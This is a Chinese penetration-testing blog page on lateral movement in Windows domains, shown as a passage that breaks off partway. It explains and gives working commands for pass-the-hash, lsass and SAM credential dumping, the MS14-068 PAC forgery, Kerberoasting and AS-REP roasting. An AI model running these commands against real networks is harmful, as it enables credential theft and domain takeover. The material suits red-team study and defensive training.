<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>横向移动方法总汇 - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_2" },
              {title: "PTH", url: "#pth" },
              {title: "MS14-068", url: "#ms14-068" },
              {title: "kerberoast", url: "#kerberoast" },
              {title: "AS_REP Roast", url: "#as_rep-roast" },
              {title: "\u59d4\u6d3e\u653b\u51fb", url: "#_3" },
              {title: "credssp \u5bfc\u51fa\u7528\u6237\u660e\u6587\u5bc6\u7801", url: "#credssp" },
              {title: "tscon\u6a2a\u5411", url: "#tscon" },
              {title: "\u5229\u7528COM/DCOM\u5bf9\u8c61", url: "#comdcom" },
              {title: "ipc", url: "#ipc" },
              {title: "wmi", url: "#wmi" },
              {title: "winrm", url: "#winrm" },
              {title: "\u5229\u7528\u7ec4\u7b56\u7565", url: "#_18" },
              {title: "\u5bc6\u7801\u55b7\u6d12", url: "#_22" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        提权
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/" class="btn btn-xs btn-link">
        printnightmare（CVE-2021-1675）
      </a>
    </div>
    
  </div>

    

    <h1 id="_1">横向移动方法总汇</h1>
<h2 id="_2">目录</h2>
<ul>
<li><a href="#PTH">PTH</a><ul>
<li><a href="#KB2871997">KB2871997</a></li>
<li><a href="#关于KB2871997的一个误解">关于KB2871997的一个误解</a></li>
<li><a href="#HASH获取">HASH获取.</a></li>
<li><a href="#hash-传递攻击-PTH-Pass-the-Hash">hash 传递攻击 PTH （Pass the Hash)</a></li>
</ul>
</li>
<li><a href="#MS14-068">MS14-068</a><ul>
<li><a href="#PAC">PAC</a></li>
<li><a href="#MS14068">MS14068</a></li>
<li><a href="#M14068利用">M14068利用</a></li>
</ul>
</li>
<li><a href="#kerberoast">kerberoast</a><ul>
<li><a href="#How-to-get-SPN">How to get SPN</a></li>
<li><a href="#How-to-get-HASH">How to get HASH</a></li>
<li><a href="#How-to-export-hash">How to export hash</a></li>
<li><a href="#How-to-crack-HASH">How to crack HASH</a></li>
<li><a href="#How-to-use-Kerberoast">How to use Kerberoast</a></li>
</ul>
</li>
<li><a href="#AS_REP-Roast">AS_REP Roast</a><ul>
<li><a href="#How-to-get-HASH">How to get HASH</a></li>
<li><a href="#How-to-crack-hash">How to crack hash</a></li>
</ul>
</li>
<li><a href="#委派攻击">委派攻击</a><ul>
<li><a href="#域委派">域委派</a><ul>
<li><a href="#非约束性委派">非约束性委派</a></li>
<li><a href="#约束性委派">约束性委派</a></li>
<li><a href="#基于资源的约束性委派">基于资源的约束性委派</a></li>
</ul>
</li>
<li><a href="#非约束性委派攻击">非约束性委派攻击</a><ul>
<li><a href="#1进行非约束性委派账户扫描">1.进行非约束性委派账户扫描</a></li>
<li><a href="#2非约束性委派的攻击">2.非约束性委派的攻击</a></li>
<li><a href="#3非约束性委派配合-Spooler打印机服务">3.非约束性委派配合 Spooler打印机服务</a></li>
</ul>
</li>
<li><a href="#约束性委派的攻击">约束性委派的攻击</a></li>
<li><a href="#基于资源的约束性委派">基于资源的约束性委派</a><ul>
<li><a href="#原理的几个点">原理的几个点：</a></li>
<li><a href="#攻击流程">攻击流程:</a></li>
<li><a href="#实操">实操</a></li>
<li><a href="#敏感用户不可委派的绕过">敏感用户不可委派的绕过</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#credssp-导出用户明文密码">credssp 导出用户明文密码</a><ul>
<li><a href="#攻击原理">攻击原理</a></li>
<li><a href="#实操">实操</a></li>
</ul>
</li>
<li><a href="#tscon横向">tscon横向</a></li>
<li><a href="#利用COMDCOM对象">利用COM/DCOM对象</a><ul>
<li><a href="#前言">前言</a></li>
<li><a href="#MMC20APPLICATION1">MMC20.APPLICATION.1</a></li>
</ul>
</li>
<li><a href="#ipc">ipc</a><ul>
<li><a href="#ipc简介">ipc简介</a></li>
<li><a href="#利用ipc横向移动">利用ipc横向移动</a><ul>
<li><a href="#at">at</a></li>
<li><a href="#schtasks">schtasks</a></li>
<li><a href="#sc">sc</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#wmi">wmi</a><ul>
<li><a href="#wmiexec">wmiexec</a></li>
</ul>
</li>
<li><a href="#winrm">winrm</a></li>
<li><a href="#利用组策略">利用组策略</a><ul>
<li><a href="#读取脚本中的密码">读取脚本中的密码</a></li>
<li><a href="#批量密码">批量密码</a></li>
<li><a href="#组策略下发计划任务进行横向移动">组策略下发计划任务进行横向移动</a></li>
</ul>
</li>
<li><a href="#密码喷洒">密码喷洒</a></li>
</ul>
<hr />
<h2 id="pth">PTH</h2>
<p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了
其中若hash加密方式是 rc4 ，那么就是pass the hash
若加密方式是aes key,那么就是pass the key
注意NTLM和kerberos协议均存在PTH:
NTLM自然不用多说
kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p>
<p>那前提就是要获取hash值了</p>
<h3 id="kb2871997"><strong>KB2871997</strong></h3>
<p>如果系统安装<strong>KB2871997</strong>补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码</p>
<p>虽然可以通过修改注册表来使LSASS强制存储明文密码</p>
<pre><code class="language-纯文本">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<p>但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。</p>
<p>同时比较重要的一点是增加了Protected Users组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击，以及用户注销后删除凭证(明文密码、LM/NTLM HASH、Kerberos的TGT票据等)</p>
<p>以及：Restricted Admin RDP模式的远程桌面客户端支持</p>
<h3 id="kb2871997_1">关于KB2871997的一个误解</h3>
<p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash。</p>
<p>很多人把这个原因归结于KB2871997补丁，实际上不然，这个事情的成因实际是UAC在捣乱。UAC是window Vista的新安全组件，具体是个啥这里也不细说了。
RID为500的账户和属于本地administrators组的域用户在通过网络远程链接时，默认就是高权限令牌。
而非RID500的本地账户则为低权限令牌，若想提升权限则需通过交互方式登录到要通过远程协助或远程桌面管理的计算机走UAC提权。</p>
<p>关于这个成因的一些系统配置选项：</p>
<p><img alt="image-20210726202713388" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202713388.png" title="image-20210726202713388" /></p>
<p>这个项默认允许内置管理员账户（RID500账户）在所有应用下都以高权限令牌运行。这也是RID500账户能PTH的原因</p>
<p>同时还有如下这个注册表项，可以关闭UAC的远程限制，即远程连接时UAC会失效，这样的话只要是administrators组的用户都能PTH辣。</p>
<p><img alt="image-20210726202837971" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202837971.png" title="image-20210726202837971" /></p>
<p>其中该值为0则代表开启UAC的远程限制,设置该值为1时关闭远程限制.</p>
<p>在域中，只有域管账户和域用户本地管理员账户可以正常PTH。在win10中测试，上面提到的两个参数均不能对域管、域用户本地管理员账户造成影响。</p>
<h3 id="hash">HASH获取.</h3>
<p>1.使用meterpreter里的mimikatz模块</p>
<pre><code class="language-纯文本">meterpreter&gt;load mimikatz
meterpreter&gt;mimikatz_command -f mimikatz的指令
privilege::debug 提权  samdump::hashes dump哈希  
或者
meterpreter&gt;msv/kerberos/widgst
</code></pre>
<p>2.使用meterpreter自带的hash获取模块</p>
<pre><code class="language-纯文本">meterpreter&gt;hashdump
meterpreter&gt;run windows/gather/smart_hashdump   (推荐使用这个)
</code></pre>
<p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理
意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p>
<p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p>
<p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p>
<pre><code class="language-纯文本">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp
然后将其传回本地
通过mimikatz.exe分别执行以下命令
&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;
</code></pre>
<p><img alt="QQ截图20210217130719" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217130719.png" title="QQ截图20210217130719" /></p>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" title="Procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" title="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a>
<a href="https://github.com/gentilkiwi/mimikatz/releases" title="mimikatz">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases" title="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>5.使用cobalt strike 获取hash</p>
<pre><code class="language-纯文本">beacon&gt;hashdump
beacon&gt;mimikatz mimikatz指令
</code></pre>
<p>6.利用sam表</p>
<p>mimikatz在线读sam表中的hash</p>
<pre><code class="language-纯文本">privilege::debug
token::elevate
lsadump::sam
</code></pre>
<p>将sam表下载到本地由mimikatz分析</p>
<pre><code class="language-纯文本">reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM
在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析
mimikatz运行
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
Domain : STU1
SysKey : fd4639f4e27c79683ae9fee56b44393f
Local SID : S-1-5-21-1982601180-2087634876-2293013296

SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : liukaifeng01
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
</code></pre>
<h3 id="hash-pth-pass-the-hash">hash 传递攻击 PTH （Pass the Hash)</h3>
<p>1.msf里使用psexec模块</p>
<pre><code class="language-纯文本">msf5 exploit(multi/handler) &gt; use exploit/windows/smb/psexec  //以root启动msf
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) &gt; set lhsot 192.168.64.133
lhsot =&gt; 192.168.64.133
msf5 exploit(windows/smb/psexec) &gt; set lhost 192.168.64.133
lhost =&gt; 192.168.64.133
msf5 exploit(windows/smb/psexec) &gt; set lport 443
lport =&gt; 443
msf5 exploit(windows/smb/psexec) &gt; set rhost 192.168.52.138
rhost =&gt; 192.168.52.138
msf5 exploit(windows/smb/psexec) &gt; set SMBUser Administrator
SMBUser =&gt; Administrator
msf5 exploit(windows/smb/psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  //一般选择NTLM HASH
SMBPass =&gt; 8a963371a63944419ec1adf687bb1be5
msf5 exploit(windows/smb/psexec) &gt; run
</code></pre>
<p>2.使用mimikatz</p>
<p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p>
<pre><code class="language-纯文本">sekurlsa::pth /user:administrator /domain:&quot;xxx.com&quot; /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  //自行修改
</code></pre>
<p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p>
<pre><code class="language-纯文本">net use \\192.168.222.131\c$
</code></pre>
<p>3.使用cobalt strike</p>
<p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p>
<p><img alt="QQ截图20210217130746" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217130746.png" title="QQ截图20210217130746" /></p>
<p><img alt="QQ截图20210217130806" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217130806.png" title="QQ截图20210217130806" /></p>
<h2 id="ms14-068">MS14-068</h2>
<p>这个洞的危害很大，可以让任意域用户提权到域管。
适用版本: server 2000以上
补丁: kb3011780</p>
<h3 id="pac">PAC</h3>
<p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。
在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。
PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p>
<p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p>
<p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p>
<p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p>
<p>PAC自身的结构</p>
<p><img alt="QQ截图20210217131035" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217131035.png" title="QQ截图20210217131035" /></p>
<p>PAC在Ticket中的结构</p>
<p><img alt="QQ截图20210217131108" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217131108.png" title="QQ截图20210217131108" /></p>
<p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。
而Authorization data的结构是这样的</p>
<p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {
ad-type     [0] Int32,
ad-data     [1] OCTET STRING }</p>
<p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。
若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。
PACTYPE包含的是 cBuffers,版本以及缓冲区 。
PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p>
<table>
<thead>
<tr>
<th>0x00000001</th>
<th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00000002</td>
<td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
</tr>
<tr>
<td>0x00000006</td>
<td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x00000007</td>
<td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000A</td>
<td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000B</td>
<td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000C</td>
<td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000D</td>
<td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000E</td>
<td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000F</td>
<td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
</tr>
</tbody>
</table>
<p>其中比较重要的是1,6和7</p>
<p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p>
<pre><code class="language-纯文本">typedef struct _KERB_VALIDATION_INFO {
FILETIME LogonTime;
FILETIME LogoffTime;
FILETIME KickOffTime;
FILETIME PasswordLastSet;
FILETIME PasswordCanChange;
FILETIME PasswordMustChange;
RPC_UNICODE_STRING EffectiveName;
RPC_UNICODE_STRING FullName;
RPC_UNICODE_STRING LogonScript;
RPC_UNICODE_STRING ProfilePath;
RPC_UNICODE_STRING HomeDirectory;
RPC_UNICODE_STRING HomeDirectoryDrive;
USHORT LogonCount;
USHORT BadPasswordCount;
ULONG UserId; //用户的sid
ULONG PrimaryGroupId;
ULONG GroupCount;
[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管
ULONG UserFlags;
USER_SESSION_KEY UserSessionKey;
RPC_UNICODE_STRING LogonServer;
RPC_UNICODE_STRING LogonDomainName;
PISID LogonDomainId;
ULONG Reserved1[2];
ULONG UserAccountControl;
ULONG SubAuthStatus;
FILETIME LastSuccessfulILogon;
FILETIME LastFailedILogon;
ULONG FailedILogonCount;
ULONG Reserved3;
ULONG SidCount;
[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
PISID ResourceGroupDomainSid;
ULONG ResourceGroupCount;
[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO;
</code></pre>
<p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p>
<h3 id="ms14068">MS14068</h3>
<p>这个漏洞的产生主要是微软犯下了三个错误：
1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的
2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC
3.下面再说</p>
<p>那么这个漏洞大致的攻击原理是什么呢。
首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID\&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p>
<p>那么伪造PAC，我们就遇到了两个问题：
1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。
2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p>
<p>来说说如何绕过PAC校验和问题。
我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p>
<p>再来说说如何绕过krbtgt hash加密TGT的问题。
因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。
这样KDC依旧会正常解析这个TGS_REQ包</p>
<p><img alt="QQ截图20210217132156" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132156.png" title="QQ截图20210217132156" /></p>
<p>注意TGS_REQ里的include-pac依旧是false。
<strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong>
上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p>
<p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p>
<h3 id="m14068">M14068利用</h3>
<p>1.工具kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718" title="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p>
<p>具体方法为，在kekeo里先执行 kerberos::purge清空票据
然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt
即可。</p>
<p><img alt="QQ截图20210217132222" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132222.png" title="QQ截图20210217132222" /></p>
<p>然后就dir \域控\c\$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p>
<p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe" title="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p>
<p>这个工具好用,</p>
<p><img alt="QQ截图20210217132233" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132233.png" title="QQ截图20210217132233" /></p>
<p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用
另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.
但返回的似乎不是域控？</p>
<h2 id="kerberoast">kerberoast</h2>
<p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p>
<h3 id="how-to-get-spn">How to get SPN</h3>
<p>如何得到域中的所有SPN？</p>
<p><strong>1.setspn</strong>
很简单，只需执行</p>
<pre><code class="language-纯文本">setspn -q */*
</code></pre>
<p>即可</p>
<p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p>
<p><img alt="QQ截图20210217132445" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132445.png" title="QQ截图20210217132445" /></p>
<h3 id="how-to-get-hash">How to get HASH</h3>
<p>如何得到hash？
有如下方法</p>
<p><strong>1.Rubeus.exe</strong></p>
<p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p>
<p>然后执行 Rubeus.exe kerberoast指令即可</p>
<p><img alt="QQ截图20210217132502" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132502.png" title="QQ截图20210217132502" /></p>
<p><strong>2.mimikatz</strong></p>
<p>mimikatz真的神器。
通过命令 kerberos::ask /target:你所指定的SPN,</p>
<p>即可通过认证的方式得到一个ST。
然后我们在kerberos::list里可以看到我们想要的ST</p>
<p><img alt="QQ截图20210217132529" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132529.png" title="QQ截图20210217132529" /></p>
<p><strong>3.powershell</strong></p>
<p>越来越发现powershell在域渗透中的重要性了
输入以下指令，即可完成HASH获取</p>
<pre><code class="language-纯文本">Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL/win7.xie.com:3306/MySQL&quot;
</code></pre>
<p>然后mimikatz导出即可</p>
<h3 id="how-to-export-hash">How to export hash</h3>
<p>获得了ST票据，但怎么导出？</p>
<p><strong>1.mimikatz</strong></p>
<p>导出所有票据</p>
<p><img alt="QQ截图20210217132544" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132544.png" title="QQ截图20210217132544" /></p>
<p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p>
<p><strong>2.Empire Powershell 框架</strong></p>
<p>github:<a href="https://github.com/EmpireProject/Empire" title="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<p>我们通过这个框架可以导出hashcat格式的hash.</p>
<pre><code class="language-纯文本">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat
</code></pre>
<p><img alt="QQ截图20210217132627" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132627.png" title="QQ截图20210217132627" /></p>
<h3 id="how-to-crack-hash">How to crack HASH</h3>
<p>如何破解HASH?</p>
<p><strong>1.HASHCAT</strong></p>
<p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p>
<pre><code class="language-纯文本">hashcat -m 13110 pass.txt hash.txt
</code></pre>
<p><strong>2.kerberoast中的tgsrepcrack.py</strong></p>
<p>支持kribi文件破解</p>
<pre><code class="language-纯文本">python3 tgsrepcrack.py pass.txt xxx.kribi
</code></pre>
<h3 id="how-to-use-kerberoast">How to use Kerberoast</h3>
<p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p>
<pre><code class="language-纯文本">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
## 将票据权限改为administrator
kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存
</code></pre>
<h2 id="as_rep-roast">AS_REP Roast</h2>
<p>较Kerberoast来说，比较鸡肋。
它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p>
<p><img alt="QQ截图20210217132642" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132642.png" title="QQ截图20210217132642" /></p>
<h3 id="how-to-get-hash_1">How to get HASH</h3>
<p><strong>1.Rubeus</strong></p>
<pre><code class="language-纯文本">Rubeus.exe asreproast
</code></pre>
<p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p>
<p><img alt="QQ截图20210217132654" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132654.png" title="QQ截图20210217132654" /></p>
<p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p>
